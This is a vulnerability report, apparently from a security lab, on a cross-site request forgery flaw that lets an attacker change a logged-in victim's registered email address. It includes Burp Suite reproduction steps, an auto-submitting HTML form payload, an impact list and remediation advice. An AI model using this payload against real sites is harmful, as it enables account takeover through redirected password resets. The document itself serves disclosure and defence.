# Cross-Site Request Forgery (CSRF) Leading to Unauthorized Email Address Change

## Vulnerability Type

Cross-Site Request Forgery (CSRF)

## Summary

The application allows authenticated users to update their registered email address through a POST request without implementing anti-CSRF protections.

An attacker can craft a malicious webpage that automatically submits an email change request on behalf of an authenticated victim, resulting in unauthorized modification of the victim's registered email address.

## Vulnerable Endpoint

```http
https://kzlabs.in/1308.php?action=settings
```

### Vulnerable Parameter

```http
new_email
```

## Steps to Reproduce

1. Log in to the application.
2. Navigate to the **Settings** page.
3. Update the email address and intercept the request using Burp Suite.
4. Observe that the request does not contain a CSRF token.
5. Right-click the request and select **Engagement Tools → Generate CSRF PoC**.
6. Save the generated HTML file.
7. Open the HTML file while authenticated to the application.
8. Observe that the email address is changed automatically without user interaction.

## Payload Used

```html
<html>
<body>
<form action="https://kzlabs.in/1308.php?action=settings" method="POST">
<input type="hidden" name="new_email" value="attacker1@mail.com" />
<input type="submit" value="Submit request" />
</form>

<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

## Proof of Concept

The application accepts a forged email update request and changes the victim's registered email address using the victim's active authenticated session.

## Impact

* Unauthorized modification of account email addresses
* Account recovery and password reset emails can be redirected to an attacker-controlled address
* Increased risk of account takeover
* Abuse of authenticated user sessions without user consent

## Recommendations for Fix

* Implement anti-CSRF tokens for all state-changing requests
* Validate the `Origin` and `Referer` headers
* Use `SameSite=Lax` or `SameSite=Strict` cookies
* Require password confirmation before allowing email address changes
* Re-authenticate users before sensitive account modifications
